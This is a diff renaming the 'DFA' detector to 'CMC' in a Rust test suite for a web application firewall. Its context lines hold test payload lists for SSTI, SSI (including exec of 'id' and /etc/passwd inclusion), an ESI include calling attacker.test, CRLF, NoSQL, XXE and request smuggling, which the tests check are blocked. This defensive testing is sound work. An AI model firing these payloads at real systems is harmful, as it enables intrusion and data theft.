@@ -181,10 +181,10 @@ fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
     }
 }
 
-fn spawn_waf_with_dfa(waf_port: u16) -> WafGuard {
+fn spawn_waf_with_cmc(waf_port: u16) -> WafGuard {
     let project_root = env!("CARGO_MANIFEST_DIR");
-    let dfa_config = format!("{project_root}/rules/dfa/config.yaml");
-    spawn_waf(waf_port, &["--dfa-load", &dfa_config])
+    let cmc_config = format!("{project_root}/rules/cmc/config.yaml");
+    spawn_waf(waf_port, &["--cmc-load", &cmc_config])
 }
 
 /// Poll the WAF health endpoint until it responds (or timeout).
@@ -342,7 +342,7 @@ const SCANNER_UAS: &[&str] = &[
     "Acunetix Web Vulnerability Scanner",
 ];
 
-/// Overflow/flooding and shellcode payloads covered by the DFA anomaly detector.
+/// Overflow/flooding and shellcode payloads covered by the CMC anomaly detector.
 const OVERFLOW_PAYLOADS: &[&str] = &[
     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
     "1111111111111111111111111111111111111111",
@@ -361,7 +361,7 @@ const OVERFLOW_PAYLOADS: &[&str] = &[
     "0x6a0x3b0x580x0f0x05",
 ];
 
-/// 10 SSTI payloads covered by the DFA anomaly detector.
+/// 10 SSTI payloads covered by the CMC anomaly detector.
 const SSTI_PAYLOADS: &[&str] = &[
     "{{7*7}}",
     "{{= 7*7 }}",
@@ -375,7 +375,7 @@ const SSTI_PAYLOADS: &[&str] = &[
     "[[${7*7}]]",
 ];
 
-/// 10 SSI injection payloads covered by the DFA anomaly detector.
+/// 10 SSI injection payloads covered by the CMC anomaly detector.
 const SSI_PAYLOADS: &[&str] = &[
     "<!--#include file=\"/etc/passwd\" -->",
     "<!--#include virtual=\"/admin/config\" -->",
@@ -389,7 +389,7 @@ const SSI_PAYLOADS: &[&str] = &[
     "%3C%21--%23exec%20cmd%3D%22id%22%20--%3E",
 ];
 
-/// 10 ESI injection payloads covered by the DFA anomaly detector.
+/// 10 ESI injection payloads covered by the CMC anomaly detector.
 const ESI_PAYLOADS: &[&str] = &[
     "<esi:include src=\"http://attacker.test/poc\" />",
     "<esi:inline name=\"frag\">owned</esi:inline>",
@@ -427,7 +427,7 @@ const CRLF_PAYLOADS: &[&str] = &[
     "test%0d%0aX-Forwarded-Host:evil.com",
 ];
 
-/// Request smuggling payloads covered by the DFA anomaly detector.
+/// Request smuggling payloads covered by the CMC anomaly detector.
 const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
     "Transfer-Encoding: chunked",
     "transfer-encoding: chunked",
@@ -441,7 +441,7 @@ const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
     "POST / HTTP/1.1%0d%0aContent-Length: 3%0d%0a%0d%0aabc",
 ];
 
-/// NoSQL injection payloads covered by the DFA anomaly detector.
+/// NoSQL injection payloads covered by the CMC anomaly detector.
 const NOSQL_INJECTION_PAYLOADS: &[&str] = &[
     r#"{"user":{"$gt":""},"pass":"admin"}"#,
     r#"{"password":{"$ne":null},"$where":"this.password.match(/admin/)"}"#,
@@ -460,7 +460,7 @@ const NOSQL_INJECTION_PAYLOADS: &[&str] = &[
     r#"{"$or":[{}], "token":"%00"}"#,
 ];
 
-/// XXE payloads covered by the DFA anomaly detector, including UTF-16LE bytes
+/// XXE payloads covered by the CMC anomaly detector, including UTF-16LE bytes
 /// represented as percent-encoding so they exercise the WAF decode path.
 const XXE_ATTACK_PAYLOADS: &[&str] = &[
     r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"#,
@@ -481,7 +481,7 @@ const XXE_ATTACK_PAYLOADS: &[&str] = &[
 ];
 
 /// URI paths with backup/temp/leak extensions — must be blocked by the
-/// Anti_exposed_backup DFA on GET/HEAD; POST to the same path must pass through.
+/// Anti_exposed_backup CMC on GET/HEAD; POST to the same path must pass through.
 const BACKUP_URI_PATHS: &[&str] = &[
     "/wp-config.php.bak",
     "/database.sql.bak",
@@ -651,12 +651,12 @@ async fn clean_post_passes_through() {
     assert_eq!(resp.status(), StatusCode::OK);
 }
 
-/// A normal browser-style request to /login.php must not be blocked by the CRLF DFA.
+/// A normal browser-style request to /login.php must not be blocked by the CRLF CMC.
 #[tokio::test]
-async fn dfa_crlf_does_not_block_clean_login_request() {
+async fn cmc_crlf_does_not_block_clean_login_request() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -733,12 +733,12 @@ async fn sqli_payload_sweep_post() {
     }
 }
 
-/// DFA overflow detection must block anomaly payloads in URI and POST body.
+/// CMC overflow detection must block anomaly payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_overflow_payload_sweep_get_and_post() {
+async fn cmc_overflow_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -773,12 +773,12 @@ async fn dfa_overflow_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA SSTI detection must block template injection payloads in URI and POST body.
+/// CMC SSTI detection must block template injection payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_ssti_payload_sweep_get_and_post() {
+async fn cmc_ssti_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -811,12 +811,12 @@ async fn dfa_ssti_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA SSI detection must block SSI injection payloads in URI and POST body.
+/// CMC SSI detection must block SSI injection payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_ssi_payload_sweep_get_and_post() {
+async fn cmc_ssi_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -849,12 +849,12 @@ async fn dfa_ssi_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA ESI detection must block ESI injection payloads in URI and POST body.
+/// CMC ESI detection must block ESI injection payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_esi_payload_sweep_get_and_post() {
+async fn cmc_esi_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -887,12 +887,12 @@ async fn dfa_esi_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA CRLF detection must block CRLF injection payloads in URI and POST body.
+/// CMC CRLF detection must block CRLF injection payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_crlf_payload_sweep_get_and_post() {
+async fn cmc_crlf_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -925,12 +925,12 @@ async fn dfa_crlf_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA request smuggling detection must block smuggling payloads in URI and POST body.
+/// CMC request smuggling detection must block smuggling payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_request_smuggling_payload_sweep_get_and_post() {
+async fn cmc_request_smuggling_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -967,12 +967,12 @@ async fn dfa_request_smuggling_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA request smuggling detection must also block real request header signals.
+/// CMC request smuggling detection must also block real request header signals.
 #[tokio::test]
-async fn dfa_request_smuggling_header_signals_are_blocked() {
+async fn cmc_request_smuggling_header_signals_are_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1005,12 +1005,12 @@ async fn dfa_request_smuggling_header_signals_are_blocked() {
     );
 }
 
-/// DFA NoSQL injection detection must block payloads in URI and POST body.
+/// CMC NoSQL injection detection must block payloads in URI and POST body.
 #[tokio::test]
-async fn dfa_nosql_injection_payload_sweep_get_and_post() {
+async fn cmc_nosql_injection_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1043,12 +1043,12 @@ async fn dfa_nosql_injection_payload_sweep_get_and_post() {
     }
 }
 
-/// DFA XXE detection must block payloads in URI and POST body, including UTF-16.
+/// CMC XXE detection must block payloads in URI and POST body, including UTF-16.
 #[tokio::test]
-async fn dfa_xxe_attack_payload_sweep_get_and_post() {
+async fn cmc_xxe_attack_payload_sweep_get_and_post() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1081,13 +1081,13 @@ async fn dfa_xxe_attack_payload_sweep_get_and_post() {
     }
 }
 
-/// Anti-exposed-backup DFA: GET/HEAD requests to paths ending with a known backup
+/// Anti-exposed-backup CMC: GET/HEAD requests to paths ending with a known backup
 /// extension must be blocked (HTTP 403).
 #[tokio::test]
-async fn dfa_anti_exposed_backup_get_is_blocked() {
+async fn cmc_anti_exposed_backup_get_is_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1108,20 +1108,20 @@ async fn dfa_anti_exposed_backup_get_is_blocked() {
     }
 }
 
-/// Anti-exposed-backup DFA: POST requests must NOT be blocked by this module.
-/// We use a WAF without DFA (no other detectors loaded) so that we can verify
+/// Anti-exposed-backup CMC: POST requests must NOT be blocked by this module.
+/// We use a WAF without CMC (no other detectors loaded) so that we can verify
 /// the method guard in isolation — only GET/HEAD should be blocked.
 #[tokio::test]
-async fn dfa_anti_exposed_backup_post_is_allowed() {
+async fn cmc_anti_exposed_backup_post_is_allowed() {
     ensure_backend();
     let port = alloc_waf_port();
-    // Spawn WAF WITHOUT the DFA config so we only test the backup module's method guard.
+    // Spawn WAF WITHOUT the CMC config so we only test the backup module's method guard.
     // The backup module itself is URI-level: if method ≠ GET/HEAD it must pass through.
     let _waf = spawn_waf(port, &[]);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
-    // These paths end with backup suffixes; without DFA they should pass through on POST.
+    // These paths end with backup suffixes; without CMC they should pass through on POST.
     let post_paths = [
         "/backup/data.bak",
         "/archive/export.old",
@@ -1142,17 +1142,17 @@ async fn dfa_anti_exposed_backup_post_is_allowed() {
         assert_ne!(
             resp.status(),
             StatusCode::FORBIDDEN,
-            "Method guard: POST {path} must not be blocked (no backup module without DFA)"
+            "Method guard: POST {path} must not be blocked (no backup module without CMC)"
         );
     }
 }
 
-/// Anti-exposed-backup DFA: normal GET paths must pass through unaffected.
+/// Anti-exposed-backup CMC: normal GET paths must pass through unaffected.
 #[tokio::test]
-async fn dfa_anti_exposed_backup_normal_paths_allowed() {
+async fn cmc_anti_exposed_backup_normal_paths_allowed() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1183,10 +1183,10 @@ async fn dfa_anti_exposed_backup_normal_paths_allowed() {
 
 /// Anti-exposed-backup: suffix in query string only (not in path) must NOT block.
 #[tokio::test]
-async fn dfa_anti_exposed_backup_suffix_in_query_string_not_blocked() {
+async fn cmc_anti_exposed_backup_suffix_in_query_string_not_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1205,14 +1205,14 @@ async fn dfa_anti_exposed_backup_suffix_in_query_string_not_blocked() {
     );
 }
 
-// ─── Anti_passwd_leak DFA tests ───────────────────────────────────────────────
+// ─── Anti_passwd_leak CMC tests ───────────────────────────────────────────────
 
 /// passwd leak: response body containing ≥2 PASSWD_TOKENS must be blocked (403).
 #[tokio::test]
-async fn dfa_anti_passwd_leak_response_is_blocked() {
+async fn cmc_anti_passwd_leak_response_is_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1225,16 +1225,16 @@ async fn dfa_anti_passwd_leak_response_is_blocked() {
     assert_eq!(
         resp.status(),
         StatusCode::FORBIDDEN,
-        "/leak/passwd response must be blocked by Anti_passwd_leak DFA"
+        "/leak/passwd response must be blocked by Anti_passwd_leak CMC"
     );
 }
 
 /// shadow leak: response body containing ≥2 SHADOW_TOKENS must be blocked (403).
 #[tokio::test]
-async fn dfa_anti_shadow_leak_response_is_blocked() {
+async fn cmc_anti_shadow_leak_response_is_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1247,16 +1247,16 @@ async fn dfa_anti_shadow_leak_response_is_blocked() {
     assert_eq!(
         resp.status(),
         StatusCode::FORBIDDEN,
-        "/leak/shadow response must be blocked by Anti_passwd_leak DFA"
+        "/leak/shadow response must be blocked by Anti_passwd_leak CMC"
     );
 }
 
 /// Normal responses with no sensitive tokens must pass through unaffected.
 #[tokio::test]
-async fn dfa_anti_passwd_leak_normal_response_allowed() {
+async fn cmc_anti_passwd_leak_normal_response_allowed() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1274,12 +1274,12 @@ async fn dfa_anti_passwd_leak_normal_response_allowed() {
     );
 }
 
-/// Without DFA enabled the passwd response passes through (200).
+/// Without CMC enabled the passwd response passes through (200).
 #[tokio::test]
-async fn dfa_anti_passwd_leak_disabled_allows_response() {
+async fn cmc_anti_passwd_leak_disabled_allows_response() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf(port, &[]); // no --dfa-load
+    let _waf = spawn_waf(port, &[]); // no --cmc-load
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1292,19 +1292,19 @@ async fn dfa_anti_passwd_leak_disabled_allows_response() {
     assert_eq!(
         resp.status(),
         StatusCode::OK,
-        "without DFA the passwd response must pass through"
+        "without CMC the passwd response must pass through"
     );
 }
 
-// ─── Java_deserialize_detect DFA tests ───────────────────────────────────────
+// ─── Java_deserialize_detect CMC tests ───────────────────────────────────────
 
 /// A POST body containing rO0A (base64 Java magic) fires 2 signals (A+C) and
 /// must be blocked at the default untrust_level=60.
 #[tokio::test]
-async fn dfa_java_deser_base64_body_blocked() {
+async fn cmc_java_deser_base64_body_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1326,10 +1326,10 @@ async fn dfa_java_deser_base64_body_blocked() {
 /// POST with Java Content-Type header AND rO0A body fires 3 signals (A+B+C)
 /// and must be blocked unconditionally.
 #[tokio::test]
-async fn dfa_java_deser_header_plus_body_three_signals_blocked() {
+async fn cmc_java_deser_header_plus_body_three_signals_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1351,10 +1351,10 @@ async fn dfa_java_deser_header_plus_body_three_signals_blocked() {
 /// The URL-encoded Java magic %AC%ED with Java content-type header fires 2
 /// signals (A+B) → blocked at untrust=60.
 #[tokio::test]
-async fn dfa_java_deser_url_encoded_magic_with_header_blocked() {
+async fn cmc_java_deser_url_encoded_magic_with_header_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1375,10 +1375,10 @@ async fn dfa_java_deser_url_encoded_magic_with_header_blocked() {
 
 /// A Commons-Collections gadget chain payload (rO0AB prefix) must be blocked.
 #[tokio::test]
-async fn dfa_java_deser_commons_collections_gadget_blocked() {
+async fn cmc_java_deser_commons_collections_gadget_blocked() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1400,10 +1400,10 @@ async fn dfa_java_deser_commons_collections_gadget_blocked() {
 /// A benign POST request with a clean JSON body and standard content-type must
 /// pass through unaffected.
 #[tokio::test]
-async fn dfa_java_deser_clean_json_post_allowed() {
+async fn cmc_java_deser_clean_json_post_allowed() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf_with_dfa(port);
+    let _waf = spawn_waf_with_cmc(port);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1422,12 +1422,12 @@ async fn dfa_java_deser_clean_json_post_allowed() {
     );
 }
 
-/// Without DFA enabled the Java deserialization request passes through (200).
+/// Without CMC enabled the Java deserialization request passes through (200).
 #[tokio::test]
-async fn dfa_java_deser_disabled_allows_request() {
+async fn cmc_java_deser_disabled_allows_request() {
     ensure_backend();
     let port = alloc_waf_port();
-    let _waf = spawn_waf(port, &[]); // no --dfa-load
+    let _waf = spawn_waf(port, &[]); // no --cmc-load
     let client = http_client();
     wait_for_waf(&client, port).await;
 
@@ -1442,6 +1442,6 @@ async fn dfa_java_deser_disabled_allows_request() {
     assert_eq!(
         resp.status(),
         StatusCode::OK,
-        "without DFA the Java deser request must pass through"
+        "without CMC the Java deser request must pass through"
     );
 }
